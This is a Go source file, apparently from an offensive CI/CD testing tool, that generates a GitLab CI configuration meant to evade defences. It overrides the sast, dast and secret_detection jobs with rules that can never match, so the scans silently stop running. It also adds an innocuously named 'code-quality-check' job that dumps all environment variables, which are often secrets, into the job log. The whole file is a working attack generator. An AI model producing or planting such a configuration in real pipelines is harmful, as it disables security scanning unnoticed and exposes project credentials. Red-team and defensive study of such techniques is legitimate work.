package payloads

import (
	"fmt"
	"strings"
)

// RulesBypassOptions configures a rules bypass (defense evasion) payload.
type RulesBypassOptions struct {
	Common          CommonOptions
	BypassedJobs    []string // jobs to suppress (default: sast, dast, secret_detection)
	AttackerJobName string   // plausible name for attacker job (default: "code-quality-check")
	MatchPaths      []string // paths for attacker job rules:exists
}

// GenerateRulesBypassYAML generates a CI config that uses rules:changes and
// rules:exists to selectively disable security scanning jobs while enabling
// attacker-controlled jobs.
func GenerateRulesBypassYAML(o RulesBypassOptions) string {
	_, stage := o.Common.defaults("bypass")
	if len(o.BypassedJobs) == 0 {
		o.BypassedJobs = []string{"sast", "dast", "secret_detection"}
	}
	if o.AttackerJobName == "" {
		o.AttackerJobName = "code-quality-check"
	}
	if len(o.MatchPaths) == 0 {
		o.MatchPaths = []string{".gitlab-ci.yml"}
	}

	var b strings.Builder

	fmt.Fprintf(&b, "stages: [test, %s]\n\n", stage)

	for _, job := range o.BypassedJobs {
		fmt.Fprintf(&b, `%s:
  stage: test
  rules:
    - changes:
        - "nonexistent-path-%.8s/**/*"
      exists:
        - "nonexistent-sentinel-%.8s"
  script:
    - echo "%s scan (will never run due to rules)"
  allow_failure: true

`, job, job, job, job)
	}

	fmt.Fprintf(&b, `%s:
  stage: %s%s%s
  rules:
`, o.AttackerJobName, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags))

	for _, p := range o.MatchPaths {
		fmt.Fprintf(&b, `    - exists:
        - %q
`, p)
	}

	b.WriteString(`  script:
    - echo "Security scans bypassed"
    - printenv | sort || true
  allow_failure: true`)

	b.WriteString(rulesManual(o.Common.Manual))
	b.WriteString("\n")

	return b.String()
}
